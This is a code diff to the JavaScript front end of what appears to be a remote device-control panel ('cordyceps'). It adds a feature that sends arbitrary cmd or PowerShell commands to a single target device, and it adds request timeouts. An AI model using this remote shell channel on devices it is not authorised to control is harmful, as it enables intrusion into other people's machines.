@@ -35,6 +35,10 @@ const updateShaInput = document.getElementById("updateShaInput");
 const updateSizeInput = document.getElementById("updateSizeInput");
 const updateQueueOfflineInput = document.getElementById("updateQueueOfflineInput");
 const pushUpdateBtn = document.getElementById("pushUpdateBtn");
+const adminTargetInput = document.getElementById("adminTargetInput");
+const adminShellSelect = document.getElementById("adminShellSelect");
+const adminCommandInput = document.getElementById("adminCommandInput");
+const sendAdminCommandBtn = document.getElementById("sendAdminCommandBtn");
 
 const groupIdInput = document.getElementById("groupIdInput");
 const groupDisplayNameInput = document.getElementById("groupDisplayNameInput");
@@ -67,6 +71,8 @@ const UPDATE_URL_KEY = "cordyceps_update_url";
 const UPDATE_SHA_KEY = "cordyceps_update_sha";
 const UPDATE_SIZE_KEY = "cordyceps_update_size";
 const UPDATE_QUEUE_OFFLINE_KEY = "cordyceps_update_queue_offline";
+const ADMIN_TARGET_KEY = "cordyceps_admin_target";
+const ADMIN_SHELL_KEY = "cordyceps_admin_shell";
 const LAST_COMMAND_SUCCESS_KEY = "cordyceps_last_command_success";
 const BOOTSTRAP_COMMAND_KEY = "cordyceps_bootstrap_command";
 const BOOTSTRAP_ACTION_KEY = "cordyceps_bootstrap_action";
@@ -79,6 +85,7 @@ const POLL_INTERVAL_MS = 300000;
 const EVENTS_RECONNECT_DELAY_MS = 4000;
 const HISTORY_PAGE_SIZE = 40;
 const HISTORY_MAX_RENDER = 120;
+const REQUEST_TIMEOUT_MS = 25000;
 
 const COMMAND_LIBRARY = [
   { value: "ping", label: "ping", category: "Connectivity", keywords: ["status", "health", "check"] },
@@ -492,6 +499,8 @@ async function apiRequest(path, payload, options = {}) {
 
   const method = options.method || "POST";
   const start = performance.now();
+  const controller = new AbortController();
+  const timeoutId = window.setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
   let response;
   try {
     response = await fetch(endpoint, {
@@ -501,10 +510,18 @@ async function apiRequest(path, payload, options = {}) {
         Authorization: `Bearer ${token}`,
       },
       ...(payload ? { body: JSON.stringify(payload) } : {}),
+      signal: controller.signal,
     });
-  } catch {
+  } catch (error) {
+    if (error && typeof error === "object" && error.name === "AbortError") {
+      setConnectionStatus("retrying");
+      throw new Error("Request timed out. Check server connectivity.");
+    }
+
     setConnectionStatus("retrying");
     throw new Error("Cannot reach server. Connection is retrying.");
+  } finally {
+    window.clearTimeout(timeoutId);
   }
 
   const latencyMs = performance.now() - start;
@@ -520,8 +537,10 @@ async function apiRequest(path, payload, options = {}) {
     const message = parseApiErrorMessage(response.status, data && data.message);
     if (response.status === 401 || response.status === 403) {
       setConnectionStatus("disconnected");
-    } else {
+    } else if (response.status >= 500) {
       setConnectionStatus("retrying");
+    } else {
+      setConnectionStatus("connected");
     }
     throw new ApiError(message, response.status);
   }
@@ -713,6 +732,19 @@ function composeCommand() {
   }
 
   return `${target} ${action}`;
+}
+
+function normalizeAdminShell(value) {
+  return normalizeActionText(value) === "powershell" ? "powershell" : "cmd";
+}
+
+function persistAdminSettings() {
+  if (!adminTargetInput || !adminShellSelect) {
+    return;
+  }
+
+  localStorage.setItem(ADMIN_TARGET_KEY, normalizeActionText(adminTargetInput.value));
+  localStorage.setItem(ADMIN_SHELL_KEY, normalizeAdminShell(adminShellSelect.value));
 }
 
 function updateDangerZone() {
@@ -1310,6 +1342,46 @@ async function pushUpdate() {
   setResult(data, { requestId, latencyMs });
 }
 
+async function sendAdminCommand() {
+  if (!adminTargetInput || !adminShellSelect || !adminCommandInput) {
+    throw new Error("Admin command controls are not available in this app build.");
+  }
+
+  const target = normalizeActionText(adminTargetInput.value);
+  const shell = normalizeAdminShell(adminShellSelect.value);
+  const commandValue = (adminCommandInput.value || "").trim();
+  if (!target) {
+    throw new Error("Admin target is required.");
+  }
+
+  if (target === "all" || parseGroupTarget(target)) {
+    throw new Error("Admin command must target one device.");
+  }
+
+  if (!commandValue) {
+    throw new Error("Admin command text is empty.");
+  }
+
+  persistAdminSettings();
+
+  const requestId = nowRequestId();
+  const action = shell === "powershell" ? "ps" : "cmd";
+  const payload = {
+    request_id: requestId,
+    text: `${target} admin ${action} ${commandValue}`,
+    source: "pwa-admin",
+    sent_at: new Date().toISOString(),
+    client_version: "pwa-v2",
+  };
+
+  const { data, latencyMs } = await apiRequest("/api/command", payload);
+  if (data && data.ok === true) {
+    setLastCommandSuccess();
+  }
+
+  setResult(data, { requestId, latencyMs });
+}
+
 async function sendCommand() {
   const text = (commandText.value || "").trim();
   if (!text) {
@@ -1669,6 +1741,11 @@ function init() {
     updateQueueOfflineInput.checked = localStorage.getItem(UPDATE_QUEUE_OFFLINE_KEY) !== "0";
   }
 
+  if (adminTargetInput && adminShellSelect) {
+    adminTargetInput.value = localStorage.getItem(ADMIN_TARGET_KEY) || "a1";
+    adminShellSelect.value = normalizeAdminShell(localStorage.getItem(ADMIN_SHELL_KEY) || "cmd");
+  }
+
   renderActionOptions("");
 
   const bootstrapAction = localStorage.getItem(BOOTSTRAP_ACTION_KEY);
@@ -1928,6 +2005,30 @@ function init() {
     });
     updateQueueOfflineInput.addEventListener("change", () => {
       persistUpdateSettings();
+    });
+  }
+
+  if (adminTargetInput && adminShellSelect && adminCommandInput && sendAdminCommandBtn) {
+    adminTargetInput.addEventListener("change", () => {
+      persistAdminSettings();
+    });
+    adminShellSelect.addEventListener("change", () => {
+      adminShellSelect.value = normalizeAdminShell(adminShellSelect.value);
+      persistAdminSettings();
+    });
+    sendAdminCommandBtn.addEventListener("click", async () => {
+      try {
+        sendAdminCommandBtn.disabled = true;
+        sendAdminCommandBtn.textContent = "Running...";
+        await sendAdminCommand();
+      } catch (error) {
+        const message = error instanceof Error ? error.message : String(error);
+        setAuthHint(message, true);
+        setResult(message, { isError: true });
+      } finally {
+        sendAdminCommandBtn.disabled = false;
+        sendAdminCommandBtn.textContent = "Run Admin Command";
+      }
     });
   }
 
